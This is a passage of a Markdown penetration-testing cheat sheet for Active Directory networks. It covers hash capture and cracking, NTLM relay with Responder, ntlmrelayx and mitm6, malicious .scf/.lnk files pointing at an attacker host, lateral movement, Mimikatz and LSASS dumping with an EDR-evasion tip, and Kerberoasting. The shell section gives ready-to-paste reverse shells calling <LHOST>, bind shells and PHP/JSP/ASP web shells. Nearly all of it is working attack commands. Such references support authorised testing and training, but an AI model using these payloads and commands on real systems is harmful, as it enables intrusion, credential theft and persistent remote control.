msf6 > run
```

<details>
<summary>Details</summary>

**Description**

- Exploits the IPMI 2.0 RAKP protocol to retrieve SHA1 password hashes without authentication.
- Works against any IPMI 2.0-compliant BMC (iDRAC, iLO, Supermicro) listening on UDP 623.

**Parameters**

- `rhosts <TARGET_IP>` — Target BMC IP.
- `output_john_file <PATH>` — Write hashes in John the Ripper RAKP format.

</details>

#### 2.11.2 John the Ripper RAKP hash cracking

```bash
john --format=rakp --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ipmi_john.hash
```

<details>
<summary>Details</summary>

**Description**

- Cracks IPMI 2.0 RAKP hashes using John the Ripper's native `rakp` format.
- Works with the John-formatted output from Metasploit's `output_john_file` option — no manual hash extraction needed.
- If wordlist fails and the target is HP iLO, switch to a mask attack for HP's 8-char uppercase+digit format:
  ```bash
  john --format=rakp --mask='?u?d' --min-length=8 --max-length=8 /tmp/ipmi_john.hash
  ```

**Parameters**

- `--format=rakp` — John format for IPMI 2.0 RAKP HMAC-SHA1.
- `--wordlist=<PATH>` — Dictionary to use.
- `--mask=<MASK>` — Mask attack for brute-force patterns.

</details>

## 3. Initial Attack Vectors

### 3.1 LLMNR/NBT-NS Poisoning

#### 3.1.1 Responder hash capture

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Captures NTLMv2 hashes by poisoning LLMNR, NBT-NS, and MDNS name resolution requests.
- Listens on the specified interface and responds to name queries, directing victims to the attacker's machine.

**Parameters**

- `-I <INTERFACE>` — Network interface to listen on (e.g. tun0).
- `-d` — Suppresses answering NetBIOS domain suffix queries.
- `-P` — Suppresses answering Proxy Auth requests.

</details>

#### 3.1.2 Cracking NTLMv2 hashes

**With hashcat:**

```bash
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

**With John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Cracks captured NTLMv2 hashes offline using a wordlist.
- After capturing a hash with Responder, copy it to a file and crack it.
- Useful when hashcat is unavailable or memory-constrained — John the Ripper detects the NTLMv2 format automatically.

**Parameters**

- `-m 5600` — Hash type for NetNTLMv2 (hashcat).
- `--wordlist=<WORDLIST>` — Wordlist for dictionary attack (John).
- `<HASH_FILE>` — File containing the captured NTLMv2 hash.

</details>

### 3.2 SMB Relay Attack

#### 3.2.1 Enumerate SMB signing

```bash
nmap -p445 <IP/MASK> --script=smb2-security-mode
```

<details>
<summary>Details</summary>

**Description**

- Checks whether SMB message signing is required on discovered hosts.
- The SMB relay attack works only when SMB signing is disabled or not required.
- If signing is `enabled and required`, that host cannot be used as a relay target.

**Parameters**

- `-p445` — Scans only the SMB port.
- `--script=smb2-security-mode` — Runs the NSE script that reports SMB signing requirements.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 3.2.2 Responder relay configuration

Edit the Responder configuration to disable SMB and HTTP services:

```bash
sudo nano /etc/responder/Responder.conf
```

Set the following values:

```
SMB = Off
HTTP = Off
```

Then start Responder:

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Disables Responder's built-in SMB and HTTP servers so that traffic is handed off to the NTLM relay tool.
- Responder continues to poison name resolution requests while the relay tool handles authentication.

</details>

#### 3.2.3 impacket-ntlmrelayx

**Dump password hashes:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support
```

**Create an interactive SMB shell:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -i
```

**Execute a command on all relayed targets:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -c "whoami"
```

<details>
<summary>Details</summary>

**Description**

- Relays captured NTLM authentications to target systems where SMB signing is disabled.
- Can dump local SAM hashes, launch interactive SMB shells, or execute arbitrary commands.

**Parameters**

- `-tf <TARGETS_FILE>` — File containing target IP addresses, one per line.
- `-smb2support` — Enables SMBv2 support for the relay.
- `-i` — Opens an interactive SMB shell after a successful relay.
- `-c <COMMAND>` — Executes the given command on the relayed target.

</details>

### 3.3 IPv6 mitm6 Attack

#### 3.3.1 mitm6

```bash
sudo mitm6 -d <DOMAIN>
```

<details>
<summary>Details</summary>

**Description**

- If IPv6 is enabled on the network but no DNS server for IPv6 exists, mitm6 can impersonate one.
- Spoofs DHCPv6 and DNS replies to redirect WPAD traffic to the attacker's machine.
- Must be run concurrently with impacket-ntlmrelayx (in a separate terminal) to relay captured authentication.

**Parameters**

- `-d <DOMAIN>` — The target Active Directory domain (e.g., `test.local`).

</details>

#### 3.3.2 impacket-ntlmrelayx (IPv6 relay)

```bash
sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
```

<details>
<summary>Details</summary>

**Description**

- Relays authentication captured via mitm6 to LDAP(S) on the domain controller, enabling domain object manipulation.
- Results are saved as HTML reports in the specified loot directory (e.g., `domain_computers.html`).
- Use `ldaps://` for encrypted LDAP; `ldap://` works if signing is not enforced.
- Requires mitm6 running concurrently in a separate terminal.

**Parameters**

- `-6` — Enables IPv6 mode.
- `-t ldap://<DC_IP>` — Target domain controller over LDAP(S).
- `-wh fakewpad.<DOMAIN>` — Spoofed WPAD hostname for the relay.
- `-l <LOOT_DIR>` — Directory where enumerated domain information is saved.

</details>

### 3.4 SMB Share Enumeration

#### 3.4.1 smbclient share listing

**Anonymous listing (null session):**

```bash
smbclient -L \\\\<TARGET_IP>
```

**Authenticated listing:**

```bash
smbclient -L \\\\<TARGET_IP> -U <USERNAME> -W <DOMAIN>
```

**Connect and interact with a known share:**

```bash
smbclient //<TARGET_IP>/"Share Name" -U <USERNAME> -W <DOMAIN> -m SMB3
smb: \> dir
smb: \> put <FILE>
```

<details>
<summary>Details</summary>

**Description**

- Lists available SMB shares on a target, anonymously or with domain credentials.
- Some servers allow anonymous null-session enumeration; most require authentication.
- Once connected to a specific share, use `dir` to list contents and `put` to upload files.

**Parameters**

- `-L` — Lists shares available on the target.
- `-U <USERNAME>` — Username for authentication.
- `-W <DOMAIN>` — Domain or workgroup name.
- `-m SMB3` — Force SMB3 protocol version.

</details>

#### 3.4.2 crackmapexec share enumeration

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
```

<details>
<summary>Details</summary>

**Description**

- Enumerates all accessible SMB shares across one or more targets.
- Reports read/write permissions for each share on every machine.
- Useful for identifying writable shares where .scf/.lnk files can be dropped.

**Parameters**

- `<IP/MASK>` — Target IP or CIDR range.
- `--shares` — Enumerates shares and access permissions.

</details>

#### 3.4.3 rpcclient null session enumeration

```bash
rpcclient -U "" <TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- Performs MS-RPC functions against the SMB server, letting us query domains, users, groups, and shares — often anonymously via a null session.
- Sends specific requests instead of relying on Nmap's slow NSE scans, revealing far more detail.
- Once connected interactively, run the queries below.

**Common queries**

| Query | Description |
|---|---|
| `srvinfo` | Server information |
| `enumdomains` | Enumerate all domains in the network |
| `querydominfo` | Domain, server, and user information |
| `netshareenumall` | Enumerate all available shares |
| `netsharegetinfo <share>` | Details on a specific share (incl. DACL) |
| `enumdomusers` | Enumerate all domain users |
| `queryuser <RID>` | Information about a specific user |
| `querygroup <RID>` | Information about a specific group |

**Parameters**

- `-U ""` — Connect with an empty username (null session).
- `-N` — Skip the password prompt.
- `-c "<command>"` — Run a single rpcclient command non-interactively.

</details>

#### 3.4.4 enum4linux-ng enumeration

```bash
enum4linux-ng.py <TARGET_IP> -A
```

<details>
<summary>Details</summary>

**Description**

- Next-gen rewrite of enum4linux that automates rpcclient queries — srvinfo, enumdomusers, netshareenumall, password/lockout policy, share access checks, NetBIOS names, SMB dialects.
- `-A` runs all basic and extended enumeration in one command.

**Parameters**

- `-A` — All mode: users, groups, shares, policies, printers.
- `-u <USER>` / `-p <PASS>` — Credentials for authenticated enumeration (deeper results).

</details>

#### 3.4.5 smbmap share enumeration

```bash
smbmap -H <TARGET_IP>
```

**With credentials:**

```bash
smbmap -H <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Enumerates SMB shares and reports effective permissions (READ, WRITE, NO ACCESS).
- `-r <SHARE>` recursively lists a share's contents; supports file search and SMB command execution.

**Parameters**

- `-H <TARGET_IP>` — Target host.
- `-d <DOMAIN>` — Domain or workgroup.
- `-u` / `-p` — Credentials for authenticated enumeration.

</details>

### 3.5 SMB Share File-Based Attacks

#### 3.5.1 Upload .scf / .lnk files

**Create a malicious .scf file:**

```bash
echo '[Shell]' > @pwn.scf
echo 'Command=2' >> @pwn.scf
echo 'IconFile=\\<ATTACKER_IP>\icon.ico' >> @pwn.scf
echo '[Taskbar]' >> @pwn.scf
echo 'Command=ToggleDesktop' >> @pwn.scf
```

**Generate .lnk files with ntlm_theft:**

```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py -g lnk -s <ATTACKER_IP> -f pwn
```

**Upload to a writable SMB share** (see [3.4.1](#341-smbclient-share-listing) for connection):

```bash
smb: \> put @pwn.scf
smb: \> put pwn.lnk
```

<details>
<summary>Details</summary>

**Description**

- If a writable SMB share is found, upload .scf or .lnk files that contain an icon path pointing to the attacker's SMB server.
- When a user browses the share in Windows Explorer, their machine attempts to load the icon file, sending their NTLMv2 hash to the attacker.
- Capture the hash with Responder running concurrently.

**Parameters**

- `//<DC_IP>/"Share Name"` — Target SMB share path (quote if share name contains spaces).
- `-U <USERNAME>` — Username for SMB authentication.
- `-W <DOMAIN>` — Domain or workgroup name.
- `-m SMB3` — Force SMB3 protocol.

</details>

## 4. Lateral Movement & Shell Access

### 4.1 Impacket

#### 4.1.1 impacket-psexec

**For domain users:**

```bash
impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**For local users:**

```bash
impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**With password hash:**

```bash
impacket-psexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Obtains a semi-interactive shell on a remote Windows system via the SMB protocol.
- Creates a Windows service on the target, runs commands through it, and deletes it on exit.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username or `./<USERNAME>` for local accounts.
- `'<PASSWORD>'` — User password (quote if it contains special characters).
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash instead of a password.
- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary by language/build).
- `<TARGET_IP>` — IP address of the target machine.

</details>

#### 4.1.2 impacket-wmiexec

```bash
impacket-wmiexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Provides a semi-interactive shell via Windows Management Instrumentation (WMI).
- Uses DCOM/WMI instead of SMB services, often evading detection better than psexec.

**Parameters**

- `<LOCAL_ADMIN>@<TARGET_IP>` — Username and target IP.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash.

</details>

#### 4.1.3 impacket-smbexec

```bash
impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- Semi-interactive shell similar to psexec but uses native Windows SMB admin shares for I/O.
- Commands are executed through batch scripts written to the ADMIN$ share.

</details>

### 4.2 Metasploit

#### 4.2.1 psexec module

```
use exploit/windows/smb/psexec
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set RHOSTS <TARGET_IP>
run
```

<details>
<summary>Details</summary>

**Description**

- Metasploit module that delivers a Meterpreter payload via the same SMB service-creation technique.
- Supports both local and domain authentication.

**Parameters**

- `SMBDomain` — Target domain (use `.` for local accounts).
- `SMBUser` — Username for authentication.
- `SMBPass` — Password for authentication.
- `RHOSTS` — Target IP address or range.

</details>

### 4.3 RDP

#### 4.3.1 xfreerdp

**For domain users:**

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:'<PASSWORD>' /d:<DOMAIN> /cert:ignore
```

**For local accounts:**

```bash
xfreerdp /v:<TARGET_IP> /u:.\<USERNAME> /p:'<PASSWORD>' /cert:ignore
```

<details>
<summary>Details</summary>

**Description**

- Connects to a Windows host via Remote Desktop Protocol for graphical access.
- Useful for running GUI-based tools (Task Manager, Mimikatz) on the target.

**Parameters**

- `/v:<TARGET_IP>` — Target IP address.
- `/u:<USERNAME>` — Username for authentication. Use `.\<USERNAME>` for local accounts.
- `/p:'<PASSWORD>'` — Password (quote if it contains special characters).
- `/d:<DOMAIN>` — Domain name (omit for local accounts).
- `/cert:ignore` — Ignores certificate validation errors.

</details>

### 4.4 Shell Access

#### 4.4.1 Reverse shells

**Listener (attacker):**

```bash
nc -lvnp <LPORT>
```

**Bash (bash built-in):**

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

**Bash (mkfifo — more reliable):**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

**PowerShell:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

<details>
<summary>Details</summary>

**Description**

- The reverse shell connects back to the attacker's listener, giving interactive command execution on the target.
- The mkfifo variant is more reliable under adverse conditions than bash's `/dev/tcp` pseudo-device.
- The PowerShell variant uses `System.Net.Sockets.TCPClient` for an interactive PowerShell session.

**Netcat Options**

`-l` — Listen for inbound connections.  
`-v` — Verbose output.  
`-n` — Skip DNS resolution.  
`-p <LPORT>` — Port to listen on.

</details>

#### 4.4.2 Bind shells

**Connection (attacker):**

```bash
nc <TARGET_IP> <LPORT>
```

**Bash (mkfifo):**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <LPORT> >/tmp/f
```

**Python:**

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<LPORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**PowerShell:**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<LPORT>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

<details>
<summary>Details</summary>

**Description**

- The bind shell opens a listening port on the target; the attacker connects to it with netcat.
- Unlike reverse shells, the connection does not need to traverse NAT or firewalls outbound.
- If the connection drops, reconnecting is possible without re-exploiting as long as the bind listener is still running.

</details>

#### 4.4.3 Web shells

**PHP:**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**JSP:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP:**

```asp
<% eval request("cmd") %>
```

**Default webroots:** Apache `/var/www/html/`, Nginx `/usr/local/nginx/html/`, IIS `c:\inetpub\wwwroot\`, XAMPP `C:\xampp\htdocs\`.

<details>
<summary>Details</summary>

**Description**

- A web shell accepts commands via HTTP parameters and prints output back on the page.
- Bypasses firewalls by running on the existing web port (80/443) rather than opening a new connection.
- Persists across reboots — the file stays on disk until removed.

</details>

#### 4.4.4 TTY upgrade

```bash
# In the netcat shell:
python -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z to background, then on YOUR terminal:
stty raw -echo
fg

# Press Enter twice, then in the shell:
export TERM=xterm-256color
stty rows <ROWS> columns <COLS>
```

<details>
<summary>Details</summary>

**Description**

- Upgrades a limited netcat shell to a full TTY with tab completion, arrow keys, and job control.
- Run `stty size` in a second local terminal to get the correct `<ROWS>` and `<COLS>` values.
- Without this step, the shell is line-based and fragile; with it, it behaves like SSH.

</details>

#### 4.4.5 Base64 file transfer

**Encode on attacker machine:**

```bash
base64 <FILE> -w 0
```

**Decode on remote host:**

```bash
echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Use when direct download is blocked by firewalls or restricted outbound connectivity.
- Base64 encoding increases size by ~33%, but works over any shell connection since it's just text.
- The `-w 0` flag disables line wrapping in the base64 output — ensures a single pastable string.

</details>

## 5. Active Directory Enumeration

### 5.1 ldapdomaindump

```bash
sudo ldapdomaindump ldaps://<DC_IP> -u '<DOMAIN>\\<USERNAME>' -p <PASSWORD>
```

For output to a specific directory:

```bash
ldapdomaindump -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' <DC_IP> -o <OUTPUT_DIR>
```

<details>
<summary>Details</summary>

**Description**

- Dumps Active Directory information via LDAP and produces human-readable HTML reports.
- Generates files detailing domain users, groups, computers, trusts, and policies.
- Works with standard domain credentials — does not require elevated privileges.

**Parameters**

- `ldaps://<DC_IP>` — Domain controller address over LDAPS.
- `-u '<DOMAIN>\\<USERNAME>'` — Domain-qualified username.
- `-p <PASSWORD>` — User password.
- `-o <OUTPUT_DIR>` — Output directory for generated HTML/JSON files.

</details>

### 5.2 BloodHound

**Collect data with BloodHound-Python (v1.9.0):**

```bash
cd ~/Desktop/bloodhound-python
source venv/bin/activate
bloodhound-python \
  -u '<USERNAME>' \
  -p '<PASSWORD>' \
  -d '<DOMAIN>' \
  -ns '<DC_IP>' \
  -c All \
  --zip
```

**Start the analysis platform — BloodHound Legacy (v4.3.1) + Neo4j (v4.4.19):**

```bash
sudo systemctl start docker.socket
sudo systemctl start docker
sudo docker start neo4j-bloodhound
cd ~/Desktop/BloodHound-linux-arm64
./BloodHound --no-sandbox --disable-gpu
```

Drag and drop the generated JSON files (or ZIP) into the BloodHound GUI.

<details>
<summary>Details</summary>

**Description**

- Maps Active Directory attack paths by collecting and analysing relationships between users, groups, computers, and permissions.
- BloodHound-Python v1.9.0 collects data remotely and was designed for the legacy BloodHound GUI (v4.3.1).
- Neo4j v4.4.19 is the database backend recommended for legacy BloodHound.

**bloodhound-python Parameters**

- `-d '<DOMAIN>'` — Target AD domain.
- `-u '<USERNAME>'` — Username for LDAP authentication.
- `-p '<PASSWORD>'` — Password for LDAP authentication.
- `-ns '<DC_IP>'` — Domain controller IP used for name resolution.
- `-c All` — Collects all available data categories.
- `--zip` — Outputs results as a single ZIP file for easier import.

</details>

### 5.3 PlumHound

**PlumHound v1.7.8:**

```bash
cd ~/Desktop/PlumHound
source venv/bin/activate

# Test database connectivity
python PlumHound.py --easy \
  -s bolt://127.0.0.1:7687 \
  -u neo4j \
  -p <NEO4J_PASSWORD>

# Generate standard reports
python PlumHound.py \
  -x tasks/default.tasks \
  -s bolt://127.0.0.1:7687 \
  -u neo4j \
  -p <NEO4J_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Runs on top of BloodHound's Neo4j database to automate common AD attack path analysis.
- Produces HTML reports of actionable vulnerabilities and attack paths.
- Neo4j and BloodHound must already be running before executing PlumHound.

**Parameters**

- `--easy` — Runs a simplified set of preconfigured queries.
- `-x tasks/default.tasks` — Executes a custom task file.
- `-s bolt://127.0.0.1:7687` — Neo4j Bolt connection string.
- `-u neo4j` — Neo4j database username.
- `-p <NEO4J_PASSWORD>` — Password for the Neo4j database.

</details>

### 5.4 impacket-samrdump

```bash
impacket-samrdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
```

<details>
<summary>Details</summary>

**Description**

- Enumerates domain users and their attributes via the SAMR (Security Account Manager Remote) protocol.
- A lightweight alternative to ldapdomaindump for a quick user listing with password policy details.
- Requires standard domain credentials — no elevated privileges needed.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
- `<DC_IP>` — Domain controller IP address.

</details>

### 5.5 impacket-lookupsid

```bash
impacket-lookupsid <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
```

<details>
<summary>Details</summary>

**Description**

- Enumerates domain users and groups by brute-forcing Security Identifiers (SIDs) via the LSARPC protocol.
- Also returns the domain SID, which is required for Golden Ticket attacks.
- Requires standard domain credentials.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
- `<DC_IP>` — Domain controller IP address.

</details>

## 6. Credential Attacks

### 6.1 crackmapexec Suite

#### 6.1.1 Credential validation

**Validate credentials across the network via SMB:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

**Validate using a password hash:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -H <NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Tests credentials across an entire subnet over the SMB protocol.
- A `Pwn3d!` result indicates local administrator rights on that machine.
- Supports both cleartext passwords and NTLM hashes.

**Parameters**

- `smb` — Protocol to test (SMB).
- `<IP/MASK>` — Target subnet range.
- `-d <DOMAIN>` — Active Directory domain name.
- `-u <USERNAME>` — Username to test.
- `-p <PASSWORD>` — Cleartext password.
- `-H <NTLM_HASH>` — NTLM hash for Pass-the-Hash authentication.

</details>

#### 6.1.2 SAM / LSA dump

**Dump SAM hashes:**

```bash
crackmapexec smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --sam
```

**Dump LSA secrets:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
```

<details>
<summary>Details</summary>

**Description**

- `--sam` dumps local SAM hashes from the target and stores them in the cmedb database.
- `--lsa` dumps LSA secrets including cached credentials and service account passwords (these are not stored in cmedb).
- Both require local administrator privileges on the target.

</details>

#### 6.1.3 LSASS dump (lsassy)

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
```

<details>
<summary>Details</summary>

**Description**

- Extracts credentials from LSASS memory remotely through SMB using the lsassy module.
- Dumped credentials are stored in the cmedb database for later retrieval.
- Requires local administrator privileges on the target.

</details>

#### 6.1.4 Password spraying

**Spray a password against a list of users:**

```bash
crackmapexec smb <IP/MASK> -u <USERS_FILE> -p '<PASSWORD>' --continue-on-success
```

**Spray a password hash against a list of users:**

```bash
crackmapexec smb <IP/MASK> -u <USERS_FILE> -H <NTLM_HASH> --continue-on-success
```

<details>
<summary>Details</summary>

**Description**

- Tests a single password or hash against every user in a file, continuing even after finding a match.
- Useful for discovering password reuse across domain accounts.
- The `--continue-on-success` flag ensures all users are tested, not just the first match.

**Parameters**

- `-u <USERS_FILE>` — File containing a list of usernames, one per line.
- `--continue-on-success` — Continues testing even after successful authentications.
- `<PASSWORD>` — Password to spray (quote if it contains special characters).

</details>

#### 6.1.5 Local authentication & cmedb

**Test local credentials (non-domain):**

```bash
crackmapexec smb <IP/MASK> -u <USERNAME> -p <PASSWORD> --local-auth
```

**Access the crackmapexec database:**

```bash
cmedb
```

<details>
<summary>Details</summary>

**Description**

- `--local-auth` authenticates to the local SAM of each target instead of the domain.
- `cmedb` provides access to the crackmapexec database, which stores discovered hosts, credentials, and dumped SAM hashes from prior runs.
- Use cmedb to review and export previously gathered credentials without re-scanning.

</details>

### 6.2 impacket-secretsdump

**Dump local hashes with credentials:**

```bash
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

**Dump local hashes with a password hash:**

```bash
impacket-secretsdump <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Extracts SAM, LSA secrets, and cached credentials from a remote Windows machine.
- Requires local administrator privileges on the target.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username.
- `<PASSWORD>` — User password.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticate using NTLM hash instead of password.
- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary).
- `<TARGET_IP>` — IP address of the target machine.

</details>

### 6.3 Kerberoasting

#### 6.3.1 impacket-GetUserSPNs

```bash
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Requests Ticket Granting Service (TGS) tickets for accounts with Service Principal Names (SPNs).
- Any domain user can request these tickets; the encrypted portion is derived from the service account's password.
- The returned hash can be cracked offline to recover the plaintext password.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Credentials of any domain user.
- `-dc-ip <DC_IP>` — Domain controller IP address.
- `-request` — Requests TGS tickets for discovered SPN accounts.
- `-outputfile <OUTPUT_FILE>` — Saves the captured TGS hashes to a file for cracking.

</details>

#### 6.3.2 Cracking TGS hashes

**With hashcat:**

```bash
hashcat -m 13100 <TGS_HASH_FILE> /usr/share/wordlists/rockyou.txt
```

**With John the Ripper:**

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <TGS_HASH_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Cracks Kerberos TGS ticket hashes offline.
- Copy the hash output from impacket-GetUserSPNs into a file crackable by hashcat or John.
- John requires explicit format specification (`--format=krb5tgs`) for Kerberos TGS hashes.

**Parameters**

- `-m 13100` — Hash type for Kerberos 5 TGS-REP etype 23 (hashcat).
- `--format=krb5tgs` — Hash format for Kerberos TGS (John).
- `<TGS_HASH_FILE>` — File containing the captured TGS hashes.
- `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.

</details>

### 6.4 Token Impersonation

**Load the incognito module:**

```
load incognito
```

**List available user tokens:**

```
list_tokens -u
```

**Impersonate a user token:**

```
impersonate_token DOMAIN\\USERNAME
```

<details>
<summary>Details</summary>

**Description**

- If a Meterpreter shell is active on a system, all available tokens on that machine can be enumerated.
- The incognito module must be loaded first before listing and impersonating tokens.
- You can impersonate any user whose token is present (e.g. a domain administrator who logged in previously).

**Commands**

- `load incognito` — Loads the incognito extension in the Meterpreter session.
- `list_tokens -u` — Lists all user tokens available on the compromised system.
- `impersonate_token DOMAIN\\USERNAME` — Adopts the security context of the specified user.

</details>

### 6.5 Credential Dumping

#### 6.5.1 Mimikatz

```
privilege::debug
lsadump::lsa /patch
sekurlsa::minidump <LSASS_DUMP>
sekurlsa::logonPasswords
kerberos::list
```

<details>
<summary>Details</summary>

**Description**

- Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and PINs from LSASS memory.
- Can operate on a live system or on an offline memory dump.

**Commands**

- `privilege::debug` — Enables SeDebugPrivilege for memory access.
- `lsadump::lsa /patch` — Dumps LSA secrets from the running system.
- `sekurlsa::minidump <LSASS_DUMP>` — Loads an offline LSASS dump file into Mimikatz.
- `sekurlsa::logonPasswords` — Extracts credentials from LSASS memory.
- `kerberos::list` — Lists all Kerberos tickets in the current session, including injected Golden Tickets.

</details>

#### 6.5.2 LSASS dump via Task Manager

1. Open Task Manager → **Details** tab
2. Find `lsass.exe`
3. Right-click → **Create dump file** → `<LSASS_DUMP>`
4. Transfer the dump file to your Kali machine
5. Extract credentials:

```bash
pypykatz lsa minidump <LSASS_DUMP>
```

<details>
<summary>Details</summary>

**Description**

- Uses the Windows Task Manager GUI to create a memory dump of the LSASS process.
- Requires graphical access to the target (RDP, VNC, or physical access).

</details>

#### 6.5.3 LSASS dump via procdump

```bash
procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
```

Alternatively, use the process ID to evade string-based EDR detection:

```powershell
Get-Process lsass
```

```cmd
tasklist | findstr lsass
```

```bash
procdump.exe -accepteula -ma <PID> <DUMP_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Dumps the LSASS process memory using the Sysinternals procdump tool.
- Using the PID instead of the process name may help evade EDR solutions that monitor for `lsass.exe` strings.

**Parameters**

- `-accepteula` — Accepts the Sysinternals license agreement silently.
- `-ma` — Writes a full memory dump.
- `<PID>` — Process ID of lsass.exe.
- `<DUMP_FILE>` — Destination filename for the memory dump.

</details>

### 6.6 GPP / cPassword Attacks

**Find cPassword in SYSVOL with Metasploit:**

```
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <DC_IP>
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
run
```

**Decrypt the cPassword:**

```bash
gpp-decrypt <CIPHERED_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Group Policy Preferences (GPP) historically stored passwords in XML files encrypted with a publicly known AES key.
- These XML files can often be found on the NETLOGON and SYSVOL shares of domain controllers.
- `gpp-decrypt` (installed by default on Kali) decrypts `cPassword` values found in GPP XML files.

**Metasploit Module Parameters**

- `RHOSTS` — Domain controller IP address.
- `SMBDomain` — Target AD domain.
